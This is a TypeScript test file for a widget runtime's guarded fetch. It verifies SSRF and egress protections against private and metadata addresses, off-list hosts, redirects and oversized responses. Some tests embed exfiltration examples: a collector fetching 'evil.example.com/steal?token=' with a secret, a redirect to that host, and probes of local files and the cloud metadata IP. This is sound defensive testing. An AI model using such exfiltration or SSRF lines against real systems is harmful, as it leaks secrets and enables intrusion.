import type { LookupAddress } from 'node:dns'
import { createServer, type Server } from 'node:http'
import type { AddressInfo } from 'node:net'
import { runCollector } from '@shiftpane/widget-runtime'
import { NO_PERMISSIONS } from '@shiftpane/widget-sdk'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { checkUrl, guardedFetch, isPublicAddress, publicOnly } from './fetch.ts'

const github = { ...NO_PERMISSIONS, network: ['api.github.com'] }

/** A resolver that answers every name with these addresses. */
const resolvesTo =
  (...addresses: string[]) =>
  (_name: string, _options: unknown, callback: (error: null, found: LookupAddress[]) => void) =>
    callback(
      null,
      addresses.map((address) => ({ address, family: address.includes(':') ? 6 : 4 })),
    )

describe('isPublicAddress', () => {
  it('knows the public internet', () => {
    for (const address of ['8.8.8.8', '140.82.112.5', '2606:4700::1111']) {
      expect(isPublicAddress(address), address).toBe(true)
    }
  })

  it('refuses this PC, the LAN and special ranges', () => {
    for (const address of [
      '127.0.0.1',
      '10.0.0.8',
      '172.16.4.1',
      '192.168.1.1',
      '169.254.169.254',
      '100.64.0.1',
      '0.0.0.0',
      '::1',
      'fe80::1',
      'fd12:3456::1',
      '::ffff:127.0.0.1',
      'not an address',
    ]) {
      expect(isPublicAddress(address), address).toBe(false)
    }
  })
})

describe('checkUrl', () => {
  it('lets a widget reach its own hosts over https', () => {
    expect(checkUrl(new URL('https://api.github.com/users/x'), github)).toBe('network')
    expect(checkUrl(new URL('https://API.GitHub.com:443/'), github)).toBe('network')
  })

  it('refuses any other host, plain http and other ports', () => {
    expect(() => checkUrl(new URL('https://evil.example.com/'), github)).toThrow(
      "evil.example.com isn't one of this widget's hosts",
    )
    expect(() => checkUrl(new URL('https://api.github.com.evil.io/'), github)).toThrow()
    expect(() => checkUrl(new URL('http://api.github.com/'), github)).toThrow(/use https/)
    expect(() => checkUrl(new URL('https://api.github.com:8443/'), github)).toThrow(/usual port/)
    expect(() => checkUrl(new URL('file:///C:/Windows/win.ini'), github)).toThrow()
    expect(() => checkUrl(new URL('https://me:secret@api.github.com/'), github)).toThrow()
  })

  it('lets a widget reach a local app at exactly the host and port it listed', () => {
    const local = { ...NO_PERMISSIONS, local: ['127.0.0.1:8085'] }
    expect(checkUrl(new URL('http://127.0.0.1:8085/data.json'), local)).toBe('local')
    expect(() => checkUrl(new URL('http://127.0.0.1:8086/'), local)).toThrow()
    expect(() => checkUrl(new URL('http://localhost:8085/'), local)).toThrow()
  })
})

describe('publicOnly', () => {
  const resolve = (lookup: ReturnType<typeof resolvesTo>, all: boolean) =>
    new Promise<unknown[]>((done) =>
      publicOnly(lookup as never)('api.github.com', { all }, (...args) => done(args)),
    )

  it('passes public addresses through, in either form Node asks for', async () => {
    const [error, address, family] = await resolve(resolvesTo('140.82.112.5'), false)
    expect([error, address, family]).toEqual([null, '140.82.112.5', 4])
    const [, all] = await resolve(resolvesTo('140.82.112.5', '140.82.112.6'), true)
    expect(all).toHaveLength(2)
  })

  it('refuses a name that leads anywhere private, even among public addresses', async () => {
    const [error] = await resolve(resolvesTo('140.82.112.5', '192.168.1.1'), true)
    expect(String(error)).toMatch(/leads to an address on this PC or its network/)
  })
})

describe('guardedFetch', () => {
  let server: Server
  let local: string
  beforeAll(async () => {
    server = createServer((request, response) => {
      if (request.url === '/away') {
        response.writeHead(302, { location: 'https://evil.example.com/steal' })
        response.end()
      } else if (request.url === '/huge') {
        response.end('x'.repeat(3 * 1024 * 1024))
      } else {
        response.setHeader('content-type', 'application/json')
        response.end(JSON.stringify({ agent: request.headers['user-agent'] }))
      }
    })
    await new Promise<void>((done) => server.listen(0, '127.0.0.1', done))
    local = `127.0.0.1:${(server.address() as AddressInfo).port}`
  })
  afterAll(() => server.close())

  const signal = () => new AbortController().signal
  const get = (url: string) => ({ url, method: 'GET', headers: {} })

  it('fetches from a local app the widget listed', async () => {
    const fetch = guardedFetch({ ...NO_PERMISSIONS, local: [local] })
    const answer = await fetch(get(`http://${local}/data`), signal())
    expect(answer.status).toBe(200)
    expect(answer.headers['content-type']).toBe('application/json')
    expect(JSON.parse(answer.body)).toEqual({ agent: 'ShiftPane-Widget' })
  })

  it('checks every redirect like the first request', async () => {
    const fetch = guardedFetch({ ...NO_PERMISSIONS, local: [local] })
    await expect(fetch(get(`http://${local}/away`), signal())).rejects.toThrow(
      "evil.example.com isn't one of this widget's hosts",
    )
  })

  it('stops reading an answer over 2 MB', async () => {
    const fetch = guardedFetch({ ...NO_PERMISSIONS, local: [local] })
    await expect(fetch(get(`http://${local}/huge`), signal())).rejects.toThrow(/more than 2 MB/)
  })

  it('never connects when an allowed name leads to this PC', async () => {
    const fetch = guardedFetch(github, { lookup: resolvesTo('127.0.0.1') as never })
    await expect(fetch(get('https://api.github.com/users/x'), signal())).rejects.toThrow(
      /leads to an address on this PC/,
    )
  })

  it("keeps a sandboxed collector to its manifest's hosts", async () => {
    const result = await runCollector({
      code: `export default async ({ fetch }) => {
        const answer = await fetch('https://evil.example.com/steal?token=' + 'secret')
        return { got: await answer.text() }
      }`,
      config: {},
      secrets: {},
      sources: {},
      fetch: guardedFetch(github),
    })
    expect(result).toEqual({
      ok: false,
      error: "evil.example.com isn't one of this widget's hosts",
    })
  })
})
